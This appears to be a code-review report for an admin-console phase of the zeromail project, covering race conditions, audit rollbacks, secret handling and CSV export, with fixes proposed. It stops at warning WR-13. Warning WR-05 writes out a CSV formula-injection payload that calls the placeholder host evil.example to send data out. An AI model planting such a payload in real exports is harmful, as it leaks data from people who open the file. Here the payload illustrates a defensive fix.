---
phase: 08-admin-console-operator-tooling
reviewed: 2026-05-20T16:00:00Z
depth: standard
files_reviewed: 92
files_reviewed_list:
  - apps/admin/e2e/catalog.spec.ts
  - apps/admin/e2e/queue.spec.ts
  - apps/admin/e2e/spend.spec.ts
  - apps/admin/e2e/tenants.spec.ts
  - apps/admin/openapi/admin-spec.json
  - apps/admin/package.json
  - apps/admin/src/__tests__/AutoRefreshIndicator.test.tsx
  - apps/admin/src/__tests__/KpiCard.test.tsx
  - apps/admin/src/components/AdminLayout.tsx
  - apps/admin/src/components/AdminModeBanner.tsx
  - apps/admin/src/components/AutoRefreshIndicator.tsx
  - apps/admin/src/components/ConfirmTwiceDialog.tsx
  - apps/admin/src/components/KpiCard.tsx
  - apps/admin/src/components/MaskedSecretField.tsx
  - apps/admin/src/features/catalog/catalog-api.ts
  - apps/admin/src/features/catalog/query-keys.ts
  - apps/admin/src/features/catalog/use-catalog.ts
  - apps/admin/src/features/catalog/use-create-model.ts
  - apps/admin/src/features/catalog/use-disable-model.ts
  - apps/admin/src/features/catalog/use-set-default-model.ts
  - apps/admin/src/features/catalog/use-sync-cancel.ts
  - apps/admin/src/features/catalog/use-sync-confirm.ts
  - apps/admin/src/features/catalog/use-sync-diff.ts
  - apps/admin/src/features/catalog/use-sync-fetch.ts
  - apps/admin/src/features/queue/query-keys.ts
  - apps/admin/src/features/queue/queue-api.ts
  - apps/admin/src/features/queue/use-dead-letters.ts
  - apps/admin/src/features/queue/use-queue-health.ts
  - apps/admin/src/features/queue/use-requeue.ts
  - apps/admin/src/features/spend/query-keys.ts
  - apps/admin/src/features/spend/spend-api.ts
  - apps/admin/src/features/spend/use-spend-dashboard.ts
  - apps/admin/src/features/tenants/tenants-api.ts
  - apps/admin/src/lib/api/admin-schema.d.ts
  - apps/admin/src/routes/_authenticated/catalog.tsx
  - apps/admin/src/routes/_authenticated/catalog-sync.$jobId.tsx
  - apps/admin/src/routes/_authenticated/master-keys.$provider.tsx
  - apps/admin/src/routes/_authenticated/master-keys.tsx
  - apps/admin/src/routes/_authenticated/queue.tsx
  - apps/admin/src/routes/_authenticated/spend.tsx
  - apps/admin/src/routes/_authenticated/tenants.$tenantId.tsx
  - apps/admin/src/routes/_authenticated/tenants.tsx
  - apps/web/eslint.config.mjs
  - backend/api/src/main/java/com/zeromail/api/config/OpenApiConfig.java
  - backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminCatalogController.java
  - backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminMasterKeyController.java
  - backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminQueueController.java
  - backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminSpendController.java
  - backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminTenantController.java
  - backend/api/src/main/java/com/zeromail/api/controllers/settings/SettingsCatalogController.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogFeatureDefaultRequest.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogListResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogModelCreateRequest.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogModelDisableRequest.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogModelResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogSyncConfirmRequest.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogSyncDiffResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/cat/CatalogSyncFetchResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/queue/DeadLetterPageResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/queue/DeadLetterRowResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/queue/QueueHealthResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/queue/RequeueRequest.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/spend/FeatureDonutSliceResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/spend/ProviderStackBarRowResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/spend/SpendDashboardResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/spend/SpendKpiResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/admin/spend/TopTenantRowResponse.java
  - backend/api/src/main/java/com/zeromail/api/dto/settings/CuratedCatalogResponse.java
  - backend/api/src/main/java/com/zeromail/api/error/AdminErrorAdvice.java
  - backend/api/src/main/java/com/zeromail/api/security/AdminResponseBodyBanFilter.java
  - backend/api/src/main/java/com/zeromail/api/security/SecurityConfig.java
  - backend/api/src/test/java/com/zeromail/api/controllers/admin/AdminQueueControllerContractTest.java
  - backend/api/src/test/java/com/zeromail/api/controllers/admin/AdminSpendControllerContractTest.java
  - backend/core/src/main/java/com/zeromail/core/admin/audit/domain/AdminAuditAction.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/domain/Feature.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/domain/event/CatalogChangedEvent.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/persistence/FeatureAttributeConverter.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/persistence/FeatureBindingEntity.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/persistence/FeatureDefaultProviderEntity.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/persistence/ModelCatalogEntity.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogAdminService.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncJobConsumer.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncJobJanitor.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncOrchestrator.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CuratedCatalogQueryService.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/FeatureDefaultProviderService.java
  - backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/ModelSchemaValidator.java
  - backend/core/src/main/java/com/zeromail/core/admin/mkey/persistence/LlmProviderMasterKeyEntity.java
  - backend/core/src/main/java/com/zeromail/core/admin/mkey/usecases/MasterKeyAdminService.java
  - backend/core/src/main/java/com/zeromail/core/admin/queue/usecases/DeadLetterRequeueService.java
  - backend/core/src/main/java/com/zeromail/core/admin/queue/usecases/QueueHealthQueryService.java
  - backend/core/src/main/java/com/zeromail/core/admin/spend/usecases/SpendAggregateQueryService.java
  - backend/core/src/main/java/com/zeromail/core/admin/spend/usecases/SpendCsvExporter.java
  - backend/core/src/main/java/com/zeromail/core/admin/tenant/usecases/AdminTenantAccess.java
  - backend/core/src/main/java/com/zeromail/core/admin/tenant/usecases/TenantDeletionRegistry.java
  - backend/core/src/main/java/com/zeromail/core/admin/tenant/usecases/TenantInspectionService.java
  - backend/core/src/main/java/com/zeromail/core/chat/llm/springai/SpringAiChatModelFactory.java
  - backend/core/src/main/java/com/zeromail/core/llm/gateway/springai/admin/ChatModelCacheEvictionListener.java
  - backend/core/src/main/java/com/zeromail/core/llm/gateway/springai/admin/ModelsProbeClient.java
  - backend/core/src/main/java/com/zeromail/core/llm/gateway/springai/admin/ProviderMasterKeyResolver.java
  - backend/core/src/main/resources/db/changelog/changes/048-admin-users.yaml
  - backend/core/src/main/resources/db/changelog/changes/049-admin-audit-event.yaml
  - backend/core/src/main/resources/db/changelog/changes/050-admin-read-event.yaml
  - backend/core/src/main/resources/db/changelog/changes/058-llm-provider-master-key.yaml
  - backend/core/src/main/resources/db/changelog/changes/068-catalog-tables-prep.yaml
  - backend/core/src/main/resources/db/changelog/changes/068b-catalog-tables-fk.yaml
  - backend/core/src/main/resources/db/changelog/changes/069-feature-default-provider-migration.yaml
  - backend/core/src/main/resources/db/changelog/changes/078-processing-job-extend.yaml
  - backend/core/src/main/resources/db/changelog/changes/079-llm-call-audit-credential-source.yaml
  - backend/core/src/test/java/com/zeromail/core/admin/arch/AdminPathBodyBanTest.java
  - backend/core/src/test/java/com/zeromail/core/admin/arch/AdminSpendPromptAccessorBanTest.java
  - backend/core/src/test/java/com/zeromail/core/admin/queue/DeadLetterRequeueServiceTest.java
  - backend/core/src/test/java/com/zeromail/core/admin/queue/QueueHealthQueryServiceSqlSpyTest.java
findings:
  critical: 4
  warning: 14
  info: 7
  total: 25
status: issues_found
---

# Phase 8: Code Review Report

**Reviewed:** 2026-05-20T16:00:00Z
**Depth:** standard
**Files Reviewed:** 92 (sampled from the 143-file Phase 8 SUMMARY artifact list — primitives, planning artifacts, and obviously generated files excluded)
**Status:** issues_found

## Summary

Phase 8 (Admin Console + Operator Tooling) ships a wide surface: WebAuthn-authenticated admin SPA, master-key CRUD, catalog sync, tenant inspection / destructive actions, queue health, spend dashboard with k-anonymity. The architectural intent — privacy-first, audit-chained, append-only — is honoured at the structural level (ArchUnit gates, append-only triggers, body-ban filter, SqlSpy test for `payload_json`).

However the implementation has several real defects worth blocking on:

- **A Redis debounce in `CatalogSyncOrchestrator.acquireDebounce()` deletes the lock immediately after acquiring it**, opening a TOCTOU window that defeats the "do not fan-out duplicate fetches" invariant.
- **`useSyncDiff` polls forever** for terminal jobs (FAILED / CANCELLED / CONFIRMED) because the backend never returns a terminal status code from `/diff`, only `AWAITING_CONFIRM` or `IN_PROGRESS`.
- **`MasterKeyAdminService.set()` writes a test-failure audit row inside the same `@Transactional` that throws** — the audit is rolled back, contradicting the "every test attempt is auditable" R-8B requirement. `rotate()` does NOT throw and so preserves the audit row → inconsistent semantics across two near-identical code paths.
- **Two JPA mismatches** that will misbehave once provider id and JPA enum name diverge: `LlmProviderMasterKeyEntity.provider` uses `@Enumerated(STRING)` while sibling entities use `@Convert(LlmProviderAttributeConverter)` — different serialization paths for the same enum on adjacent tables.

The catalog hooks, tenant deletion confirm-twice flow, and spend dashboard k-anonymity logic look correct. CSV export is wired through a row-count estimate before any bytes flow. Audit JSON construction by string concatenation works today because input values are validated/enum-bounded, but is fragile under future field additions.

## Critical Issues

### CR-01: `CatalogSyncOrchestrator.acquireDebounce()` releases the debounce lock immediately after acquiring it

**File:** `backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncOrchestrator.java:202-218`
**Issue:** The Redis debounce is supposed to short-circuit concurrent `startFetch` calls for the same provider within the 60s window. The current logic is:
```java
Boolean acquired = redisTemplate.get().opsForValue().setIfAbsent(key, jobId, DEBOUNCE_TTL);
if (Boolean.TRUE.equals(acquired)) {
    redisTemplate.get().delete(key);   // <-- deletes immediately
    return Optional.empty();
}
```
When `setIfAbsent` succeeds (we WERE the first caller), the code deletes the key, then returns `empty()` so the outer flow falls through and proceeds to insert a new job. The real jobId is set into Redis at line 88-91 (`opsForValue().set(debounceKey, jobId, TTL)`) but BETWEEN the delete and that set, a parallel admin call hits `setIfAbsent` and ALSO acquires/releases — both calls now believe they hold the debounce slot and both insert a `processing_job` row. This defeats R-8D-DEBOUNCE.

Additionally, the SQL fallback `findActiveJobWithin(provider, now - 60s)` (line 71-76) helps but is not transactional with the Redis path — two concurrent transactions can both see "no active job" because their inserts aren't visible to each other yet.

**Fix:**
```java
private Optional<UUID> acquireDebounce(LlmProvider provider, UUID candidateJobId) {
    if (redisTemplate.isEmpty()) {
        return Optional.empty();
    }
    String key = debounceKey(provider);
    Boolean acquired = redisTemplate.get().opsForValue()
            .setIfAbsent(key, candidateJobId.toString(), DEBOUNCE_TTL);
    if (Boolean.TRUE.equals(acquired)) {
        return Optional.empty(); // we hold the slot — keep it, do NOT delete
    }
    // Someone else holds the slot — return their jobId
    String existingJobId = redisTemplate.get().opsForValue().get(key);
    return (existingJobId == null || existingJobId.isBlank())
            ? Optional.empty()
            : Optional.of(UUID.fromString(existingJobId));
}
```
Pass the new `jobId` in so the Redis slot is populated with the real id from the start; remove the redundant `template.opsForValue().set(...)` call at line 88-91 (it now sets the same value with the same TTL). The `releaseDebounce()` calls in `confirm()` and `cancel()` already clean up.

---

### CR-02: `MasterKeyAdminService.set()` rolls back its own failure audit row

**File:** `backend/core/src/main/java/com/zeromail/core/admin/mkey/usecases/MasterKeyAdminService.java:120-154` (and `rotate()` 156-203 for the inconsistency)
**Issue:** Inside the `@Transactional` `set()` method, when the connectivity probe fails the code does:
```java
if (testResult != MasterKeyTestResult.OK) {
    writeSetFailedAudit(provider, testResult, reason, requestIp, requestId); // INSERT inside tx
    throw new MasterKeyTestFailedException(testResult);                       // tx rollback
}
```
Throwing a runtime exception from a `@Transactional` method rolls back the entire transaction, including the just-written `admin_audit_event` row. The operator who tried to save a bad key sees a 4xx error but **no audit trail of the attempt** — directly contradicting the "every master-key test/set/rotate is auditable" R-8B-AUDIT invariant and what `MasterKeyAdminService.testConnection()` already gets right (it persists the audit before returning the result, no throw).

`rotate()` (line 171-186) does NOT throw on test failure — it returns `new MasterKeyRotationResult("TEST_FAILED", ...)` and the audit row persists. So `set` and `rotate` have inconsistent semantics for the same condition.

**Fix:** Either (a) make `set()` mirror `rotate()` and return a `MasterKeySetResult("TEST_FAILED", testResult, null)` instead of throwing, or (b) write the audit on a separate `REQUIRES_NEW` propagation so it survives the parent rollback. Option (a) is preferred for consistency:
```java
if (testResult != MasterKeyTestResult.OK) {
    writeSetFailedAudit(provider, testResult, reason, requestIp, requestId);
    return new MasterKeySetResult(0L, testResult); // 0L sentinel: not stored
}
```
Then the controller maps non-OK results to a 400 + body containing `result_enum` so the UI still shows the failure.

---

### CR-03: `useSyncDiff` polls forever on terminal sync jobs

**File:** `apps/admin/src/features/catalog/use-sync-diff.ts:7-11`
**Issue:** The poll guard is `query.state.data?.status === 'AWAITING_CONFIRM' ? false : 2000`. Backend `CatalogSyncOrchestrator.diffResult()` (CatalogSyncOrchestrator.java:108-110) only returns two strings: `"AWAITING_CONFIRM"` when step is `DIFF_READY`, else `"IN_PROGRESS"`. So a job that has been **CONFIRMED, CANCELLED, or FAILED** appears as `IN_PROGRESS` to the frontend, and the React Query refetcher fires every 2s indefinitely. If a user keeps the sync detail page open (or comes back to it), they generate one admin-read query every 2 seconds against the audited backend endpoint and the auto-refresh never stops.

Additionally, `useSyncConfirm` and `useSyncCancel` invalidate `catalogQueryKeys.all` / `catalogQueryKeys.sync()` but the singular sync-job key is `catalogQueryKeys.syncJob(jobId)`, which IS a child of `sync()` so it does get re-fetched — but the new response will still say `IN_PROGRESS` after confirm and the polling continues.

**Fix:** Add explicit terminal states to the backend response shape and stop polling on them. Either:
1. Backend: extend `responseStatus` in `CatalogSyncOrchestrator.diffResult()` to include `CONFIRMED`, `CANCELLED`, `FAILED` (read `step` and map all terminal values), then frontend stops polling on any non-`IN_PROGRESS` value.
2. Frontend stop-gap: stop polling once `isSuccess` and `data.status !== 'IN_PROGRESS'`, OR track whether the user has already triggered `confirm`/`cancel` mutations and disable the query via `enabled`.

Recommended:
```ts
refetchInterval: (query) => {
  const status = query.state.data?.status;
  if (status === 'IN_PROGRESS') return 2000;
  return false; // AWAITING_CONFIRM, CONFIRMED, CANCELLED, FAILED → stop
},
```
Combined with backend exposing the terminal states.

---

### CR-04: `MasterKeyProviderRoute` keeps the plaintext key in React state without wiping

**File:** `apps/admin/src/routes/_authenticated/master-keys.$provider.tsx:39, 76-90, 92-105`
**Issue:** `plaintextKey` is stored in a React `useState` string and only cleared with `setPlaintextKey('')` after the mutation resolves. While in flight, the value lives in React's fiber tree (reachable from React DevTools, Chrome heap snapshot, "Copy as JS path", etc.) and in any HMR snapshot during development. The backend correctly zeroes the byte array (`AdminMasterKeyController` lines 71-84 use `try/finally + Arrays.fill`), but the frontend keeps the secret reachable for the full lifetime of the page render up to and after the save click. Any client-side error reporter (Sentry-like) or React Error Boundary serializing component state would also capture it.

JavaScript strings are immutable so "wiping" isn't possible the same way as a Java `byte[]`. But the lifetime can be minimized:

**Fix:**
1. Move the plaintext into a `useRef<string>` (still mutable, but skips fiber state and DevTools) and read it imperatively at submit time instead of binding through `value`.
2. Set `setPlaintextKey('')` **before** the awaited `mutateAsync` rather than after; pass the captured local variable into the mutation.
3. Add `autoComplete="new-password"` on the input (already `autoComplete="off"` in `MaskedSecretField` which doesn't suppress all password managers).
4. Set browser `<meta name="referrer" content="strict-origin">` and ensure no client-side error reporter is wired into the admin SPA (per CLAUDE.md observability section, admin should not propagate to Grafana). 
5. Verify Spring Session's serialization of the in-flight HTTP request body is HTTPS-only — `cookieSerializer.setUseSecureCookie(false)` (SecurityConfig.java:176) is currently `false` in dev, must be `true` in prod (environment-conditional).

## Warnings

### WR-01: JPA enum-mapping inconsistency between `LlmProviderMasterKeyEntity` and sibling entities

**File:** `backend/core/src/main/java/com/zeromail/core/admin/mkey/persistence/LlmProviderMasterKeyEntity.java:20-23` vs `backend/core/src/main/java/com/zeromail/core/admin/cat/persistence/ModelCatalogEntity.java:21-23` / `FeatureDefaultProviderEntity.java:25-27`
**Issue:** `LlmProviderMasterKeyEntity.provider` uses `@Enumerated(EnumType.STRING)` (Hibernate writes `enum.name()`); `ModelCatalogEntity.provider` and `FeatureDefaultProviderEntity.provider` use `@Convert(converter = LlmProviderAttributeConverter.class)` (custom converter using `LlmProvider.id()`). Today these produce the same bytes IFF `LlmProvider.name() == LlmProvider.id()`. If the convention ever changes (e.g. `ROUTER_9R` → id "router_9r" lowercase), the master-key row will silently mis-link to catalog rows via the implicit `provider` join key.

**Fix:** Pick one path for the whole admin module. Either remove `@Enumerated` from `LlmProviderMasterKeyEntity.provider` and add `@Convert(converter = LlmProviderAttributeConverter.class)` (preferred — matches the "fail-loud on unknown id" pattern from CLAUDE.md), or remove the converter from the catalog entities. Add an ArchUnit test asserting all `LlmProvider` fields on `@Entity` classes use the same annotation.

---

### WR-02: `ProviderMasterKeyResolver.toMaskedRow()` triggers full master-key decryption on every `list()` call

**File:** `backend/core/src/main/java/com/zeromail/core/llm/gateway/springai/admin/ProviderMasterKeyResolver.java:150-174`
**Issue:** To compute the masked-key display string, `toMaskedRow()` calls `resolveOptional(provider)` which DECRYPTS the master key into the in-memory cache. So `GET /api/admin/master-keys` (the list view, called on every admin page load) decrypts every provider's master key into the cache, holding plaintext in `cachedKeysByProvider` for 15 min. This expands the attack surface dramatically: an admin who only wants to view the list page now causes 5+ plaintext master keys to live in JVM heap for 15 min — a memory dump scenario that previously only exposed the actively-used provider now exposes all of them.

**Fix:** Mask from the encrypted ciphertext metadata rather than decrypting. The mask format (per `MasterKeyMasker.mask`) only needs the first/last few characters which can be stored alongside the encrypted blob at write time:
1. Add a `masked_key` column to `llm_provider_master_key` populated at insert/rotate time.
2. `toMaskedRow()` reads `entity.getMaskedKey()` directly — no decryption.
3. Restrict `resolveOptional()` calls to actual outbound LLM calls and connectivity probes.

If the mask must remain derived from current plaintext (e.g., to detect drift), gate it behind a per-call admin "reveal" action that audits the decryption.

---

### WR-03: Audit JSON built by string concatenation — fragile under value escaping

**File:** Many: `CatalogAdminService.java:106, 150-154`; `CatalogSyncOrchestrator.java:84, 153-159, 191-194`; `MasterKeyAdminService.java:282-294, 311`; `FeatureDefaultProviderService.java:62-68`
**Issue:** `before_state_json` / `after_state_json` JSON payloads are built by manual string concatenation:
```java
"{\"provider\":\"" + provider.id() + "\",\"model_id\":\"" + modelId + "\"}"
```
Today this is safe because `modelId` passes `MODEL_ID_PATTERN` (`^[a-zA-Z0-9._:/\-]{1,128}$`) and `provider.id()` is enum-derived. But:
1. The validator is enforced at the controller boundary — if a future internal caller bypasses it (e.g., catalog-sync auto-import passing through `upsertFetchedModel`), a stray quote or backslash in `displayName` could corrupt the JSON. `displayName` accepts up to 200 chars with no escape filter.
2. `MasterKeyAdminService.writeChangedAudit` interpolates `maskedKey` which is fixed-format today but is one refactor away from carrying a JSON-unsafe character.
3. The Postgres `jsonb` cast will fail and surface as a `500` to the admin, but the failure path also rolls back the underlying write transaction — silently losing the catalog mutation.

**Fix:** Centralize audit JSON construction through Jackson (the rest of the codebase uses `tools.jackson.databind.ObjectMapper`). `AdminAuditWriter.append(...)` already accepts a String; create a typed overload that accepts `Map<String, Object>` and serializes through ObjectMapper. Then all callers move from string concat to:
```java
adminAuditWriter.append(action, "model_catalog", null, null,
        Map.of("provider", provider.id(), "model_id", modelId),
        reason, requestIp, requestId);
```

---

### WR-04: `AdminResponseBodyBanFilter` only inspects flat top-level property names

**File:** `backend/api/src/main/java/com/zeromail/api/security/AdminResponseBodyBanFilter.java:74-93`
**Issue:** The filter parses the JSON response stream token-by-token and matches `propertyName` against `AdminBodyBanRegex.FORBIDDEN_FIELD_NAME`. It catches a property anywhere in the structure (Jackson's `nextToken()` walks the whole tree), which is good, BUT it only flags **string values longer than 200 chars**. A short-but-still-leaking value (an email subject, a 150-char snippet, a tenant's gmailAccountEmail with a real PII fragment) sails through. Also, the regex is conservative: a property named `subject` or `email` is allowed even though `gmailAccountEmail` IS valid metadata. So the 200-char threshold is the only line of defense for borderline cases.

Worse: when a forbidden-shape field DOES trip the filter (line 53-64), the existing response body is reset and replaced with a 500 — but `responseWrapper.resetBuffer()` is called AFTER `getContentAsByteArray()` already buffered the response and committed status headers. If the body has already started streaming (e.g., `StreamingResponseBody` for CSV in `/spend/dashboard/csv`), `resetBuffer()` throws `IllegalStateException` and the response goes out partially.

**Fix:**
1. Drop the 200-char threshold and rely on the field-name regex alone (it's narrower than `body|payload|prompt|completion|snippet|content` — those names should NEVER appear in an admin response shape).
2. Skip the filter entirely for `text/csv` responses (or for any `StreamingResponseBody` — check `responseWrapper.getContentSize() == 0 && response.isCommitted()`).
3. Add a unit test specifically with `StreamingResponseBody` to catch the `resetBuffer()` regression.

---

### WR-05: CSV formula injection not defended

**File:** `backend/core/src/main/java/com/zeromail/core/admin/spend/usecases/SpendCsvExporter.java:92-103`
**Issue:** `escape()` quotes a cell only if it contains `,`, `"`, `\n`, or `\r`. It does NOT prefix-escape cells that begin with `=`, `+`, `-`, `@`, or a tab/CR — the classic CSV formula-injection vector. Today the columns are `bucketDate / provider / feature / credentialSource / totalCost / callCount` all of which are enum/numeric and safe. The risk is purely forward-looking: if `tenant_email` or any operator-supplied label ever joins the column set, a malicious tenant email like `=HYPERLINK("http://evil.example/?p="&A1)` would execute in Excel/LibreOffice when the operator opens the export.

**Fix:** Add formula-injection prefix detection to `escape()`:
```java
private static String escape(String value) {
    if (value == null) return "";
    String cell = value;
    if (!cell.isEmpty() && "=+-@\t\r".indexOf(cell.charAt(0)) >= 0) {
        cell = "'" + cell; // OWASP-recommended leading single quote
    }
    if (cell.indexOf(',') >= 0 || cell.indexOf('"') >= 0 ||
        cell.indexOf('\n') >= 0 || cell.indexOf('\r') >= 0) {
        return "\"" + cell.replace("\"", "\"\"") + "\"";
    }
    return cell;
}
```

---

### WR-06: Spend dashboard accepts `from > to` and `to` in the future without validation

**File:** `apps/admin/src/routes/_authenticated/spend.tsx:111-128` + `backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminSpendController.java:85-97`
**Issue:** Frontend `onApplyCustom` validates `from >= to` and sets an error string, but `queryInput` (lines 53-62) reads `customFrom`/`customTo` directly — bypassing the apply button. So an inverted range is fetched with `paused=false` (the duration is negative, hence `<= 90 days` → `rangeOk=true`) and hits the backend, which silently returns empty aggregates. The backend `AdminSpendController.dashboard(...)` accepts the inverted range without checking. Backend should be the source of truth on the invariant.

**Fix:**
- Backend: add `@Valid` `SpendQuery` validation that rejects `from > to` and `to.isAfter(clock.instant().plus(Duration.ofDays(1)))`, with `error.admin.invalid_range`.
- Frontend: drop the dead "Apply" button (the dates are reactive already) OR make the dates only commit on Apply (extract `appliedFrom`/`appliedTo` state separate from `customFrom`/`customTo`). The current half-applied UX is misleading.

---

### WR-07: `AdminQueueController.requeue()` missing `AdminContext.currentOrThrow()` defense-in-depth

**File:** `backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminQueueController.java:60-67`
**Issue:** Every other admin endpoint (catalog, master-keys, spend, tenants) begins with `AdminContext.currentOrThrow()` even though `@PreAuthorize("hasRole('ADMIN')")` already gates the call. The redundancy is deliberate — `DeadLetterRequeueServiceTest.requeue_requires_admin_context()` asserts the service throws when `AdminContext` is empty. `requeue()` is the only mutation endpoint that relies entirely on Spring Security and the service-level `AdminContext.currentOrThrow()` at `DeadLetterRequeueService.java:49`. Today that's fine, but the inconsistency is a refactoring trap.

**Fix:** Add the line so every admin mutation route has the same shape:
```java
@PostMapping("/dead-letters/{jobId}/requeue")
@ResponseStatus(HttpStatus.NO_CONTENT)
public void requeue(...) {
    AdminContext.currentOrThrow();
    deadLetterRequeueService.requeue(...);
}
```

---

### WR-08: `AdminLayout.tsx` reads a `disabled` field that does not exist on the navigation items

**File:** `apps/admin/src/components/AdminLayout.tsx:23-32, 56`
**Issue:** `navigationItems` is declared as a `const ... as const` literal whose items only have `to / label / icon`. Line 56 then branches on `if (navigationItem.disabled)` — TypeScript narrows this to `never`, so the branch is **always false** and the dead `<span>` block can never render. If you add a `{ to: '/secret-tab', label: 'Secret', icon: ..., disabled: true }` entry later, the literal type widens but you've already lost the type-level guarantee that all items share a shape.

**Fix:** Either declare the array with an explicit `NavigationItem` type that includes `disabled?: boolean`, or delete the dead branch.

---

### WR-09: `spend.tsx` `onApplyCustom` and `customRangeError` are effectively decorative

**File:** `apps/admin/src/routes/_authenticated/spend.tsx:111-130, 53-62`
**Issue:** Setting `customRangeError` does not gate the fetch; the fetch reactively responds to `customFrom`/`customTo`/`preset` changes via `useMemo`. So the "Apply" button only ever clears an error or sets one — it does not commit the date pair. Users who don't click apply still get the un-validated range fetched immediately, hitting the backend with an inverted or zero-width range.

**Fix:** Either remove the apply button entirely (admit dates are live) OR keep `customFrom`/`customTo` as draft state and only set `appliedFrom`/`appliedTo` when apply is clicked, then build `queryInput` from `appliedFrom`/`appliedTo`. Pair with WR-06.

---

### WR-10: `requeueDeadLetter` synthesizes a fake audit id

**File:** `apps/admin/src/features/queue/queue-api.ts:86-95` (and the same `auditId: 'recorded'` pattern in `tenants.$tenantId.tsx:299`, `catalog.tsx:326`)
**Issue:** The backend returns `204 No Content` for the requeue/pause/disconnect/delete endpoints. The frontend hard-codes a placeholder `auditId: 'recorded'` and shows it in the success toast: `"Action recorded. Audit row recorded."`. The user can't correlate the action with the actual `admin_audit_event.id` for incident response, and the toast text reads as a stub. The TODO comment acknowledges this but it's been left in production.

**Fix:** Backend: return `201 Created` with `Location: /api/admin/audit-events/{id}` (or just a body `{ auditId: UUID }`) for every state-mutating admin endpoint that writes an audit row. Frontend reads the real id from the Location header or response body. Until then, the success message should not claim "Audit row recorded" — say "Action recorded" only.

---

### WR-11: `SpringAiChatModelFactory.platformModel()` does not zero the plaintext API key

**File:** `backend/core/src/main/java/com/zeromail/core/chat/llm/springai/SpringAiChatModelFactory.java:114-139`
**Issue:** `platformModel` decodes `resolvedMasterKey.plaintextKey()` into a String at line 126 (`new String(resolvedMasterKey.plaintextKey(), UTF_8)`), which is then captured by the `OpenAiChatOptions.builder().apiKey(apiKey)` lambda. The `byOk` counterpart (line 141-174) correctly zeros `decryptedKey` in a `finally`. But `platformModel` does NOT — the String reference lives in the built `OpenAiChatModel`'s options forever, and the underlying byte array passed in from `ResolvedMasterKey` is also not zeroed by this code path (the `ResolvedMasterKey` record makes its own internal `Arrays.copyOf` so the caller can't zero it externally — see `ResolvedMasterKey` constructor at `ProviderMasterKeyResolver.java:209-211`).

**Fix:** Two options:
1. Use a `char[]` for the API key end-to-end (where Spring AI permits), zero after the model is built.
2. Document this as an accepted long-lived plaintext (the chat model needs it on every call) and ensure the model instance is GC'd promptly when the cache evicts. Currently `evictByProvider` / `evictByModelIds` removes the map entry but the lambda inside `OpenAiChatOptions` keeps the String reachable — needs a `.close()` or explicit overwrite on eviction.

---

### WR-12: `MasterKeyAdminService.probe()` `finally` block is a misleading no-op with a comment that lies

**File:** `backend/core/src/main/java/com/zeromail/core/admin/mkey/usecases/MasterKeyAdminService.java:257-266`
**Issue:**
```java
private MasterKeyTestResult probe(...) {
    try {
        return modelsProbeClient.probe(...);
    } finally {
        // The caller may still need the bytes for encryption; zeroing happens after successful
        // storage or in the controller for test-only requests.
    }
}
```
An empty finally block with only a comment is a code smell that reads as "we forgot to wipe here". It also implies a contract ("caller zeros") that's only obvious if you trace through five call sites. Future refactors will inevitably break the contract.

**Fix:** Delete the empty `try/finally` (replace with `return modelsProbeClient.probe(...)` directly) and move the contract comment to the Javadoc of `probe()`. Better still, take ownership: have `probe()` accept a `byte[]` and clone it internally, freeing the caller from the ownership concern.

---

### WR-13: `ProviderMasterKeyResolver.compute()` race between expiry-check and reload

**File:** `backend/core/src/main/java/com/zeromail/core/llm/gateway/springai/admin/ProviderMasterKeyResolver.java:74-89`
**Issue:** `cachedKeysByProvider.compute(provider, (k, existing) -> { if (existing != null && !existing.isExpired(...)) return existing; if (existing != null) existing.wipe(); return load(provider); });`. The `compute()` callback DOES synchronize within the same key (ConcurrentHashMap guarantees that). But `load(provider)` performs a JPA fetch + decrypt INSIDE the lock — every key access serializes against every other access for the same provider. Under high parallelism (many concurrent triages all needing the same provider), this becomes a global bottleneck.

More importantly: if `existing.wipe()` is called and then `load` throws (DB transient failure), the old plaintext bytes are zeroed AND the map's mapping is removed (compute returning null isn't possible here, but throwing inside compute removes the mapping). The next caller refetches from scratch — fine. BUT: any other concurrent caller that already extracted a `ResolvedMasterKey` outside the lock now holds a copy of the bytes (record constructor copies). Those copies are not zeroed when wipe() ran. Hours later, those copies are still in heap.

